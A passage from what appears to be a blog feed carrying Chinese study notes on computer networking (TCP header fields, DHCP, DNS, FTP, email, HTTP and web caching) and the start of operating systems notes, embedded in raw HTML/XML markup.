390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(2735,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3735.2,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(4235.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path></g></g></g></svg></mjx-container>，确认号增加到最后一个后，下一个确认号又从0开始。用来指出期望收到对方下一个TCP报文段的数据载荷的第一个字节的序号，同时也是对之前收到的所有数据的确认。若确认号=n，则表明到序号n-1为止的所有数据都已被正确接收，期望接受序号为n的数据。</li><li>数据偏移：占4比特，并以4字节为单位。用来指出TCP报文段的数据载荷部分的起始处距离TCP报文段的起始处有多远。这个字段实际上指出了TCP报文段的首部长度，最小为20字节，最大为60字节。</li><li>保留：占6比特，保留为今后使用，但目前应置为0。</li><li>紧急标志位URG：1表示紧急指针字段有效；0表示无效。</li><li>确认标志位ACK：1表示确认号字段有效；0表示无效。TCP规定在连接建立后所有传送的TCP报文段都必须把ACK置1。</li><li>推送标志位PSH：接收方的TCP收到该标志位为1的报文段会尽快上交应用进程，而不必等到接收缓存都填满后再向上交付。</li><li>复位标志位RST：用来复位TCP连接。当RST=1时，表示TCP连接出现了异常，必须释放连接，然后再重新建立连接。RST置1还用来拒绝一个非法的报文段或拒绝打开一个TCP连接。</li><li>同步标志位SYN：在TCP连接建立时用来同步序号。</li><li>终止标志位FIN：用来释放TCP连接。</li><li>窗口：占16比特，以字节为单位。指出发送本报文段的一方的接收窗口。窗口值作为接收方让发送方设置其发送窗口的依据。这是以接收方的接受能力来控制发送方的发送能力，称为流量控制。</li><li>校验和：占16比特，检查范围包括TCP报文段的首部和数据载荷两部分。在计算校验和时，要在TCP报文段的前面加上12字节的伪首部。</li><li>紧急指针：占16比特，以字节为单位，用来指明紧急数据的长度。当发送方有紧急数据时，可将紧急数据插队到发送缓存的最前面，并立刻封装到一个TCP报文段中进行发送。紧急指针会指出本报文段数据载荷部分包含了多长的紧急数据，紧急数据之后是普通数据。</li><li>选项：<ul><li>最大报文段长度MSS选项：TCP报文段数据载荷部分的最大长度。</li><li>窗口扩大选项：为了扩大窗口(提高吞吐率)。</li><li>时间戳选项：①用来计算往返时间(RTT)；②用于处理序号超范围的情况，又称为防止序号绕回(PAWS)。</li><li>选择确认选项</li></ul></li><li>填充：由于选项的长度可变，因此使用填充来确保报文段首部是4的整数倍。</li></ul><h3 id="5-9-1-序号、确认号、ACK字段"><a href="#5-9-1-序号、确认号、ACK字段" class="headerlink" title="5.9.1 序号、确认号、ACK字段"></a>5.9.1 序号、确认号、ACK字段</h3><img src="/posts/e255a10a/5.9.2.png" class="" title="序号、确认号、ACK字段"><h1 id="6-应用层"><a href="#6-应用层" class="headerlink" title="6. 应用层"></a>6. 应用层</h1><h2 id="6-1-应用层概述"><a href="#6-1-应用层概述" class="headerlink" title="6.1 应用层概述"></a>6.1 应用层概述</h2><p>应用层解决通过应用进程的交互来实现特定网络应用的问题。</p><p>应用层是计算机网络体系结构的最顶层，是设计和建立计算机网络的最终目的，也是计算机网络中发展最快的部分。</p><ul><li>早期基于文本的应用(电子邮件、远程登录、文件传输、新闻组)</li><li>20世纪90年代将因特网带入千家万户的万维网(WWW)</li><li>当今流行的即时通信、P2P文件共享及各种音视频应用</li><li>计算设备的小型化和“无处不在”，宽带住宅接入和无线接入的日益普及和迅速发展，为未来更多的新型应用提供了广阔的舞台</li></ul><img src="/posts/e255a10a/6.1.1.png" class="" title="应用层概述"><h2 id="6-2-客户-服务器-C-S-方式和对等-P2P-方式"><a href="#6-2-客户-服务器-C-S-方式和对等-P2P-方式" class="headerlink" title="6.2 客户/服务器(C/S)方式和对等(P2P)方式"></a>6.2 客户/服务器(C/S)方式和对等(P2P)方式</h2><ul><li><p>网络应用程序运行在处于网络边缘的不同的端系统上，通过彼此间的通信来完成某项任务。</p></li><li><p>开发一种新的网络应用给首先要考虑的问题就是网络应用程序在各种端系统上的组织方式和他们之间的关系。</p><p>目前流行的主要有以下两种：</p><p>客户/服务器(Client/Server，C/S)方式<br>对等方式(Peer-to-Peer，P2P)方式</p></li></ul><h3 id="6-2-1-客户-服务器方式"><a href="#6-2-1-客户-服务器方式" class="headerlink" title="6.2.1 客户/服务器方式"></a>6.2.1 客户/服务器方式</h3><img src="/posts/e255a10a/6.2.1.png" class="" title="客户/服务器方式"><h3 id="6-2-2-对等方式"><a href="#6-2-2-对等方式" class="headerlink" title="6.2.2 对等方式"></a>6.2.2 对等方式</h3><img src="/posts/e255a10a/6.2.2.png" class="" title="对等方式"><h2 id="6-3-动态主机配置协议-DHCP"><a href="#6-3-动态主机配置协议-DHCP" class="headerlink" title="6.3 动态主机配置协议(DHCP)"></a>6.3 动态主机配置协议(DHCP)</h2><p>互联网广泛使用的动态主机配置协议 DHCP (Dynamic Host Configuration Protocol) ，它提供了即插即用连网 (plug-and-play networking) 的机制。这种机制允许一台计算机加入新的网络和自动获取 IP 地址，而不用手工配置。</p><p>在没有DHCP时，我们需要手动给每台主机设计IP地址、子网掩码、默认网关等数据。</p><img src="/posts/e255a10a/6.3.1.png" class="" title="动态主机配置协议"><p>当在网络中设置DHCP服务器后：</p><img src="/posts/e255a10a/6.3.2.png" class="" title="动态主机配置协议"><h3 id="6-3-1-DHCP工作过程"><a href="#6-3-1-DHCP工作过程" class="headerlink" title="6.3.1 DHCP工作过程"></a>6.3.1 DHCP工作过程</h3><ul><li><p>DHCP 使用客户/服务器方式</p></li><li><p>DHCP在运输层使用UDP协议，DHCP 服务器运行在 67 号端口， DHCP客户运行在 68 号端口</p></li></ul><p>1.客户端广播DHCP发送报文：</p><img src="/posts/e255a10a/6.3.3.png" class="" title="DHCP工作过程"><p>由于此时客户端还没有设置地址，所以将源地址设置为0.0.0.0，目的地址设置为广播地址255.255.255.255，目的端口设置为67（DHCP服务器端口）。除了DHCP服务器外，其他进程不能接收该UDP报文（其他接收端口不是67）。</p><p>在DHCP发送报文中格式比较复杂，只需要知道其内部有事务ID和DHCP客户端的MAC地址。</p><p>DHCP服务器进程是一直运行的，当收到DHCP发送报文后，会根据其MAC地址在自己的数据库查找，若数据库中有该MAC地址的配置信息，则用这些配置信息来构建发送报文。若没有，则采用默认信息来构建并发送DHCP报文。</p><p>2.DHCP服务器接收报文后返回DHCP提供报文：</p><img src="/posts/e255a10a/6.3.4.png" class="" title="DHCP工作过程"><p>源地址设置为服务器地址，由于客户端还没有设置地址，所以将目的地址设置为广播地址255.255.255.255（只有广播地址能使其接收到），目的端口设置为68（DHCP客户端端口）。除了DHCP客户端外，其他进程不能接收该UDP报文（其他接收端口不是68）。</p><p>3.客户端发送选择服务器的发送请求报文：</p><img src="/posts/e255a10a/6.3.5.png" class="" title="DHCP工作过程"><p>为了避免向网络中的每一个DHCP服务器单播发送DHCP请求报文，选择广播发送报文，来告知他们是不是自己选择的DHCP服务器。DPCH服务器根据报文中的内容，若发现其选择是本服务器，便将其接收，并给该客户端发送DHCP确认报文。</p><p>4.DHCP服务器发送确认报文：</p><img src="/posts/e255a10a/6.3.6.png" class="" title="DHCP工作过程"><p>当到达租用期的一半时，会发送续约请求给服务器，根据服务器情况进行相应反馈。若没收到服务器反馈，会在0.875个租用期后再次发送并等待回应。若还是没有反应，会在租用期过期后立即放弃使用该IP地址。</p><p>注意：客户端可以随时终止使用该IP地址。</p><img src="/posts/e255a10a/6.3.7.png" class="" title="DHCP工作过程"><h3 id="6-3-2-DHCP中继代理"><a href="#6-3-2-DHCP中继代理" class="headerlink" title="6.3.2 DHCP中继代理"></a>6.3.2 DHCP中继代理</h3><p>有路由器进行隔离的网络能使用DHCP吗？</p><img src="/posts/e255a10a/6.3.8.png" class="" title="DHCP中继代理"><p>由于路由器隔离广播域，因此其DHCP请求报文不能发送到DHCP服务器中，所以其不能使用DHCP服务。解决方法是给路由器配置DHCP服务器的IP地址使其成为DHCP代理中继：</p><img src="/posts/e255a10a/6.3.9.png" class="" title="DHCP中继代理"><p>这样做的原因是可以减少DHCP服务器的数量。通过中继代理进行转发来获取DHCP，而不用新增加一个DHCP服务器。</p><h2 id="6-4-域名系统-DNS"><a href="#6-4-域名系统-DNS" class="headerlink" title="6.4 域名系统(DNS)"></a>6.4 域名系统(DNS)</h2><p>域名系统(Domain Name System，DNS)的作用是将请求的域名转换为IP地址，给相关程序进行发送IP请求。DNS报文使用运输层的UDP协议进行封装，运输层端口号为53。</p><img src="/posts/e255a10a/6.4.1.png" class="" title="域名系统的作用"><h3 id="6-4-1-域名空间"><a href="#6-4-1-域名空间" class="headerlink" title="6.4.1 域名空间"></a>6.4.1 域名空间</h3><img src="/posts/e255a10a/6.4.2.png" class="" title="层次结构的命名树"><img src="/posts/e255a10a/6.4.3.png" class="" title="域名系统"><img src="/posts/e255a10a/6.4.4.png" class="" title="顶级域名的分类"><img src="/posts/e255a10a/6.4.5.png" class="" title="域名空间"><h3 id="6-4-2-域名服务器"><a href="#6-4-2-域名服务器" class="headerlink" title="6.4.2 域名服务器"></a>6.4.2 域名服务器</h3><img src="/posts/e255a10a/6.4.6.png" class="" title="域名服务器"><h3 id="6-4-3-域名解析过程"><a href="#6-4-3-域名解析过程" class="headerlink" title="6.4.3 域名解析过程"></a>6.4.3 域名解析过程</h3><img src="/posts/e255a10a/6.4.7.png" class="" title="域名解析过程"><h3 id="6-4-4-高速缓存"><a href="#6-4-4-高速缓存" class="headerlink" title="6.4.4 高速缓存"></a>6.4.4 高速缓存</h3><img src="/posts/e255a10a/6.4.8.png" class="" title="高速缓存"><img src="/posts/e255a10a/6.4.9.png" class="" title="高速缓存"><h2 id="6-5-文件传送协议-FTP"><a href="#6-5-文件传送协议-FTP" class="headerlink" title="6.5 文件传送协议(FTP)"></a>6.5 文件传送协议(FTP)</h2><ul><li><p>文件传送是将某台计算机中的文件通过网络传送到可能相距很远的一台计算机中，是一项基本的网络应用。</p></li><li><p>文件传输协议(File Transfer Protocol，FTP)是因特网上使用的最广泛的文件传送协议。</p><ul><li><p>FTP提供交互式的访问，允许客户指明文件的类型和格式（如指明是否使用ASCII码），并允许文件具有存取权限（如访问文件必须经过授权，并输入有效的口令）。</p></li><li><p>FTP屏蔽了各计算机系统的细节，因而适合于在异构网络中任意计算机之间传输文件。</p></li></ul></li><li><p>在因特网发展早期阶段，用FTP传输占整个因特网通信量的三分之一，而电子邮件和域名系统所产生的通信量还要小于FTP所产生的通信量。到了1995年，万维网(WWW)的通信量才首次超过了FTP。</p></li></ul><h3 id="6-5-1-FTP的应用"><a href="#6-5-1-FTP的应用" class="headerlink" title="6.5.1 FTP的应用"></a>6.5.1 FTP的应用</h3><p>FTP使用C/S方式（用户/服务器方式），端口号为21/20。</p><p>FTP客户计算机可将各种类型的文件上传到FTP服务器计算机：</p><img src="/posts/e255a10a/6.5.1.png" class="" title="FTP的应用"><p>FTP客户计算机可以从FTP服务器计算机下载文件：</p><img src="/posts/e255a10a/6.5.2.png" class="" title="FTP的应用"><p>FTP服务器可以有专用的高速服务器组成，也可以是普通的个人计算机。在Windows中就可以使用自带的FTP服务创建FTP 服务器，或者使用第三方FTP软件创建客户端。</p><p>FTP的常见用途是在计算机之间传输文件，尤其是用于批量传输文件。FTP的另一个常见用途是让网站设计者将构成网站内容的大量文件批量上传到他们的Web服务器。</p><h3 id="6-5-2-FTP的基本工作原理"><a href="#6-5-2-FTP的基本工作原理" class="headerlink" title="6.5.2 FTP的基本工作原理"></a>6.5.2 FTP的基本工作原理</h3><img src="/posts/e255a10a/6.5.3.png" class="" title="FTP的基本工作原理"><p>默认情况下，FTP使用TCP 21端口进行控制连接，TCP 20端口进行数据连接。</p><p>控制连接在整个会话期间一直保持打开，用于传送FTP相关的控制命令。</p><p>传输连接用于文件传输，每次文件传输时才建立，传输结束后就关闭。</p><h2 id="6-6-电子邮件"><a href="#6-6-电子邮件" class="headerlink" title="6.6 电子邮件"></a>6.6 电子邮件</h2><ul><li>电子邮件（E-mail）是因特网上最早流行的一种应用，并且仍是当今因特网上最重要、最实用的应用之一。</li><li>传统的电话通信属于实时通信，具有以下两个缺点：<ul><li>电话通信的主叫和被叫方必须同时在场</li><li>一些不是十分紧迫的电话也常常不必要地打断人们的工作或休息</li></ul></li><li>电子邮件和邮件系统的寄信相似，其工作过程如下：<ol><li>发件人将邮件发送到自己使用的邮件服务器</li><li>发件人的邮件服务器将收到的邮件按其目的地址转发到收件人邮件服务器中的收件人邮箱</li><li>收件人在方便的时候访问收件人邮件服务器中自己的邮箱，获取收到的电子邮件</li></ol></li><li>电子邮件使用方便、传递迅速而且费用低廉。它不仅可以传送文字信息，而且还可附上声音和图像。</li><li>由于电子邮件的广泛应用，现在许多国家已经正式取消了电报业务。在我国，电信局的电报业务也因电子邮件的普及而濒临消失。</li></ul><img src="/posts/e255a10a/6.6.1.png" class="" title="电子邮件"><img src="/posts/e255a10a/6.6.2.png" class="" title="电子邮件"><h3 id="6-6-1-SMTP基本工作原理"><a href="#6-6-1-SMTP基本工作原理" class="headerlink" title="6.6.1 SMTP基本工作原理"></a>6.6.1 SMTP基本工作原理</h3><p>简单邮件传送协议(Simple Mail Transfer Protocol， SMTP)</p><p>SMTP发送方的邮件服务器会周期性对邮件进行缓存扫描，若发现有邮件，会通过TCP协议，端口号25与接收方的邮件服务器建立连接。</p><p>建立这条连接后，STMP客户基于这条连接给SMTP服务器发送SMTP命令，共14条。SMTP服务器会给SMTP客户端发送相应的应答，共21种。</p><p>双方通过这种命令和应答的方式最终实现客户端发送邮件给SMTP服务器。</p><img src="/posts/e255a10a/6.6.3.png" class="" title="SMTP基本工作原理"><h3 id="6-6-2-电子邮件格式"><a href="#6-6-2-电子邮件格式" class="headerlink" title="6.6.2 电子邮件格式"></a>6.6.2 电子邮件格式</h3><p>电子邮件的信息格式并不是由SMTP定义的，而是在RFC 822中单独定义的。这个RFC文档已在2008年更新为RFC 5322。一个电子邮件有信封和内容两部分。而内容又由首部和主体两部分构成。</p><img src="/posts/e255a10a/6.6.4.png" class="" title="电子邮件格式"><h3 id="6-6-3-多用途因特网邮件扩展MIME"><a href="#6-6-3-多用途因特网邮件扩展MIME" class="headerlink" title="6.6.3 多用途因特网邮件扩展MIME"></a>6.6.3 多用途因特网邮件扩展MIME</h3><img src="/posts/e255a10a/6.6.5.png" class="" title="MIME"><p>多用途因特网邮件扩展(Multipurpose Internet Mail Extension，MIME)增加了5个新的邮件首部字段，这些字段提供了有关邮件主体的信息。定义了许多邮件内容的格式，对多媒体电子邮件的表示方法进行了标准化。定义了传统编码，可对任何内容格式进行转换，而不会被邮件系统改变。</p><p>实际上，MIME不仅仅用于SMTP，也用于同样面向ASCII字符的HTTP。</p><h3 id="6-6-4-邮件读取协议"><a href="#6-6-4-邮件读取协议" class="headerlink" title="6.6.4 邮件读取协议"></a>6.6.4 邮件读取协议</h3><img src="/posts/e255a10a/6.6.6.png" class="" title="邮件读取协议"><h3 id="6-6-5-基于万维网的电子邮件"><a href="#6-6-5-基于万维网的电子邮件" class="headerlink" title="6.6.5 基于万维网的电子邮件"></a>6.6.5 基于万维网的电子邮件</h3><img src="/posts/e255a10a/6.6.7.png" class="" title="基于万维网的电子邮件"><h2 id="6-7-万维网-WWW"><a href="#6-7-万维网-WWW" class="headerlink" title="6.7 万维网(WWW)"></a>6.7 万维网(WWW)</h2><ul><li>万维网WWW(World Wide Web)并非某种特殊的计算机网络。它是一个规模很大、联机式的信息储藏所，是运行在因特网上的一个分布式应用。</li><li>万维网利用网页之间的超链接将不同网站的网页链接成一张逻辑上的信息网。万维网用链接的方法能非常方便地从互联网上的一个站点访问另一个站点，从而主动地按需获取丰富的信息。</li></ul><img src="/posts/e255a10a/6.7.1.png" class="" title="浏览器"><p>客户端向目的IP地址发送请求，服务器收到后会通过因特网发送响应报文，解析成万维网文档，显示在客户端上。</p><p>为了方便地访问在世界范围的文档，万维网使用统一资源定位符URL来指明因特网上任何种类“资源”的位置。</p><p>URL的一般格式由以下四个部分组成：</p><script type="math/tex; mode=display"><协议>://<主机>:<端口>/<路径></script><h3 id="6-7-1-万维网文档"><a href="#6-7-1-万维网文档" class="headerlink" title="6.7.1 万维网文档"></a>6.7.1 万维网文档</h3><p>我们对浏览器的页面进行另存为到本地，其文件就是万维网的文档。</p><img src="/posts/e255a10a/6.7.2.png" class="" title="万维网文档"><h3 id="6-7-2-超文本传输协议-HTTP"><a href="#6-7-2-超文本传输协议-HTTP" class="headerlink" title="6.7.2 超文本传输协议(HTTP)"></a>6.7.2 超文本传输协议(HTTP)</h3><p>HTTP定义了浏览器（万维网进行）怎样向万维网服务器请求万维网文档，以及万维网服务器怎么样把万维网文档传送给浏览器。</p><img src="/posts/e255a10a/6.7.3.png" class="" title="HTTP协议"><p>首先客户进程会利用80端口和服务器建立TCP请求，然后通过该连接发送HTTP请求报文。服务器收到请求报文后也会通过该连接发送HTTP响应报文。</p><img src="/posts/e255a10a/6.7.4.png" class="" title="HTTP响应报文"><img src="/posts/e255a10a/6.7.5.png" class="" title="HTTP响应报文"><h3 id="6-7-3-HTTP报文格式"><a href="#6-7-3-HTTP报文格式" class="headerlink" title="6.7.3 HTTP报文格式"></a>6.7.3 HTTP报文格式</h3><img src="/posts/e255a10a/6.7.6.png" class="" title="HTTP请求报文格式"><img src="/posts/e255a10a/6.7.7.png" class="" title="HTTP请求报文格式"><img src="/posts/e255a10a/6.7.8.png" class="" title="HTTP响应报文格式"><p>响应报文中常见的状态行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 202 Accepted接受请求</span><br><span class="line">HTTP/1.1 400 Bad Request错误的请求</span><br><span class="line">HTTP/1.1 404 Not Found找不到页面</span><br></pre></td></tr></table></figure><h3 id="6-7-4-Cookie"><a href="#6-7-4-Cookie" class="headerlink" title="6.7.4 Cookie"></a>6.7.4 Cookie</h3><img src="/posts/e255a10a/6.7.9.png" class="" title="Cookie"><img src="/posts/e255a10a/6.7.10.png" class="" title="Cookie"><h3 id="6-7-5-万维网缓存与代理服务器"><a href="#6-7-5-万维网缓存与代理服务器" class="headerlink" title="6.7.5 万维网缓存与代理服务器"></a>6.7.5 万维网缓存与代理服务器</h3><ul><li>在万维网中还可以使用缓存机制以提高万维网的效率。</li><li>万维网缓存又称为Web缓存(Web Cache)，可位于客户机，也可位于中间系统上。位于中间系统上的Web缓存又称为代理服务器(Proxy Server)。</li><li>Web缓存把最近的一些请求和响应暂存在本地磁盘中。当新请求到达时，若发现这个请求与暂时存放的请求相同，就返回暂存的响应，而不需要按URL的地址再次去因特网访问该资源。</li></ul><p>当校园网中的某台主机要访问因特网上的原始服务器时，会先请求代理服务器，若代理服务器存放有所请求的对象，则代理服务器会向该主机发回所包含的请求对象的响应。</p><img src="/posts/e255a10a/6.7.11.png" class="" title="缓存与代理服务器"><p>当校园网中的某台主机要访问因特网上的原始服务器时，请求代理服务器，若代理服务器没有所请求的对象，则代理服务器会向原始服务器发送请求。服务器响应后，代理服务器会将其放入自己的Web缓存，再将其发给用户主机。</p><img src="/posts/e255a10a/6.7.12.png" class="" title="缓存与代理服务器"><img src="/posts/e255a10a/6.7.13.png" class="" title="缓存与代理服务器"><p>有这样一种情况：若代理服务器存放该请求的缓存后，原始服务器该请求响应有所修改，此时若用户再次请求，在代理服务器的缓存中就是旧的响应报文了。所以原始服务器通常会为每个响应的对象设定一个修改时间字段和一个有效日期字段。</p><p>若修改时间字段未过期，则会之间将缓存中报文封装在响应报文中发回给主机。</p><img src="/posts/e255a10a/6.7.14.png" class="" title="缓存与代理服务器"><p>若修改时间已过期，此时会向原始服务器发送一个if-modified-since信号，意思是询问是否发生响应文档改变。若没有改变，则原始服务器回送一个Not Modified信号，代理服务器接收到后会将修改时间改为当前时间，不修改缓存中的文档，并且将缓存中的文档包装在响应报文中发送给用户主机。</p><img src="/posts/e255a10a/6.7.15.png" class="" title="缓存与代理服务器"><p>若修改时间已过期，此时会向原始服务器发送一个if-modified-since信号，意思是询问是否发生响应文档改变。若改变，则原始服务器会在响应报文中附带修改后的文档，代理服务器接收到后会将修改时间改为当前时间，并且缓存中的文档进行更新，更新后，将缓存中新的文档包装在响应报文中发送给用户主机。</p><img src="/posts/e255a10a/6.7.16.png" class="" title="缓存与代理服务器">]]></content>
    
    
    <summary type="html">&lt;p&gt;这个笔记配合&lt;a href=&quot;https://www.bilibili.com/video/BV1c4411d7jb&quot;&gt;计算机网络微课堂&lt;/a&gt;食用效果更佳，这位老师的PPT做得真的好，讲得也特别简单易懂，力推！&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
  </entry>
  
  <entry>
    <title>操作系统</title>
    <link href="http://example.com/posts/d04bd5bc.html"/>
    <id>http://example.com/posts/d04bd5bc.html</id>
    <published>2022-04-15T02:47:14.758Z</published>
    <updated>2022-05-14T07:18:32.131Z</updated>
    
    <content type="html"><![CDATA[<p>这个笔记是基于 <a href="https://www.bilibili.com/video/BV1YE411D7nH?p=1">王道考研 操作系统</a> 写的，我觉得前面会讲得有点枯燥，但后面结合图和例题讲算法时非常不错，可以一看。</p><span id="more"></span><h1 id="1-操作系统概述"><a href="#1-操作系统概述" class="headerlink" title="1. 操作系统概述"></a>1. 操作系统概述</h1><p>操作系统（英语：Operating System，缩写：OS）是管理计算机硬件与软件资源的系统软件，同时也是计算机系统的内核与基石。操作系统需要处理如管理与配置内存、决定系统资源供需的优先次序、控制输入与输出设备、操作网络与管理文件系统等基本事务。操作系统也提供一个让用户与系统交互的操作界面。</p><h2 id="1-1-操作系统的功能"><a href="#1-1-操作系统的功能" class="headerlink" title="1.1 操作系统的功能"></a>1.1 操作系统的功能</h2><ol><li><p>作为系统资源的管理者：文件管理、设备管理、内存管理、处理机制(进程管理)</p><p>目标：安全、高效</p></li><li><p>作为用户和计算机硬件之间的接口：命令接口、程序接口(系统调用)、图形用户界面(GUI)</p><p>目标：方便用户使用</p></li><li><p>作为最接近硬件层次：实现对硬件及其的扩展</p></li></ol><h2 id="1-2-操作系统的特征"><a href="#1-2-操作系统的特征" class="headerlink" title="1.2 操作系统的特征"></a>1.2 操作系统的特征</h2><h3 id="1-2-1-并发"><a href="#1-2-1-并发" class="headerlink" title="1.2.1 并发"></a>1.2.1 并发</h3><p>并发：指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的。</p><p>并行：指两个或多个事件在同一时刻同时发生。</p><p>操作系统的并发性指计算机系统中同时存在着多个运行着的程序。操作系统通过引入进程与线程，使得程序能够并发运行。</p><h3 id="1-2-2-共享"><a href="#1-2-2-共享" class="headerlink" title="1.2.2 共享"></a>1.2.2 共享</h3><p>共享：指系统中的资源可供内存中多个并发执行的进程共同使用。</p><p>有两种共享方式：互斥共享和同时共享。</p><p>互斥共享：系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源。</p><p>同时共享：系统中的某些资源，允许一个时间段内由多个进程并发对它们进行访问。</p><h3 id="1-2-3-虚拟"><a href="#1-2-3-虚拟" class="headerlink" title="1.2.3 虚拟"></a>1.2.3 虚拟</h3><p>虚拟：把物理上的实体转换为多个逻辑上的对应物。物理实体是实际存在的，而逻辑上的对应物是用户感受到的。</p><p>主要有两种虚拟技术：时分复用技术和空分复用技术。</p><p>多个进程在同一个处理器并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一个小时间片，并且这个时间片在进程之间互相切换。</p><p>虚拟内存使用了空分复用技术，它将物理内存抽象为地址空间，每个进程都有各自的地址空间。地址空间和物理内存使用页面进行交换。地址空间的页并不需要全部在物理内存中，当使用到一个没有在物理内存的页时，执行页面置换算法，将该页置换到内存中。</p><h3 id="1-2-4-异步"><a href="#1-2-4-异步" class="headerlink" title="1.2.4 异步"></a>1.2.4 异步</h3><p>异步：在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底的，而是走走停停，以不可预知的速度向前推进。</p><blockquote><p>如果失去了并发性，则系统只能串行地处理各个进程，每个进程的执行会一贯到底。如果失去了并发性，则一个时间段内系统中只需运行一道程序，那么就失去了实现虚拟性的意义。同样共享也是建立在并发的基础上的，如果没有并发，共享是无法实现的。所以并发是共享、虚拟、异步的前提。</p></blockquote><h2 id="1-3-操作系统的发展和分类"><a href="#1-3-操作系统的发展和分类" class="headerlink" title="1.3 操作系统的发展和分类"></a>1.3 操作系统的发展和分类</h2><h3 id="1-3-1-手工操作阶段"><a href="#1-3-1-手工操作阶段" class="headerlink" title="1.3.1 手工操作阶段"></a>1.3.1 手工操作阶段</h3><p>主要缺点：用户独占全机、人机速度矛盾导致资源利用率极低</p><h3 id="1-3-2-批处理系统"><a href="#1-3-2-批处理系统" class="headerlink" title="1.3.2 批处理系统"></a>1.3.2 批处理系统</h3><h4 id="1-3-2-1-单道批处理系统"><a href="#1-3-2-1-单道批处理系统" class="headerlink" title="1.3.2.1 单道批处理系统"></a>1.3.2.1 单道批处理系统</h4><p>引入<strong>脱机输入/输出技术</strong>(用磁带完成)，并<strong>监督程序</strong>(操作系统的雏形)负责控制作业的输入、输出。</p><p>主要优点：缓解了一定程度的人机速度矛盾，资源利用率有所提升。</p><p>主要缺点：<strong>内存中仅能有一道程序运行</strong>，只有该程序运行结束之后才能调入下一道程序。<strong>CPU有大量时间是在空闲等待I/O完成</strong>。资源利用率依然很低。</p><h4 id="1-3-3-2-多道批处理系统"><a href="#1-3-3-2-多道批处理系统" class="headerlink" title="1.3.3.2 多道批处理系统"></a>1.3.3.2 多道批处理系统</h4><p>主要优点：多道程序<strong>并发</strong>执行，<strong>共享</strong>计算机资源。<strong>资源利用率大幅提升</strong>，CPU和其它资源保持“忙碌”状态，系统吞吐量增大。</p><p>主要缺点：用户响应时间长，<strong>没有人机交互功能</strong>(用户提交自己的作业之后就只能等待计算机处理完成，中间不能控制自己的作业运行)</p><h3 id="1-3-3-分时操作系统"><a href="#1-3-3-分时操作系统" class="headerlink" title="1.3.3 分时操作系统"></a>1.3.3 分时操作系统</h3><p>分时操作系统：计算机以<strong>时间片</strong>为单位<strong>轮流为各个用户/作业服务</strong>，各个用户可通过终端与计算机进行交互。</p><p>主要优点：用户请求可以被及时响应，<strong>解决了人机交互的问题</strong>。允许多个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感受不到别人的存在。</p><p>主要缺点：<strong>不能优先处理一些紧急任务</strong>。操作系统对各个用户/作业都是完全公平的，循环地为每个用户/作业服务一个时间片，不区分任务的紧急性。</p><h3 id="1-3-4-实时操作系统"><a href="#1-3-4-实时操作系统" class="headerlink" title="1.3.4 实时操作系统"></a>1.3.4 实时操作系统</h3><p>主要优点：<strong>能够优先响应一些紧急任务</strong>，某些紧急任务不需时间片排队。</p><p>在实时操作系统的控制下，计算机系统接收到外部信号后及时进行处理，并且<strong>要在严格的时限内处理完事件</strong>。实时操作系统的主要特点是<strong>及时性和可靠性</strong>。</p><script type="math/tex; mode=display">实时操作系统\begin{cases}硬实时系统：必须在绝对严格的规定时间内完成处理\\软实时系统：能接受偶尔违反时间规定\end{cases}</script><h2 id="1-4-操作系统的运行机制和体系结构"><a href="#1-4-操作系统的运行机制和体系结构" class="headerlink" title="1.4 操作系统的运行机制和体系结构"></a>1.4 操作系统的运行机制和体系结构</h2><script type="math/tex; 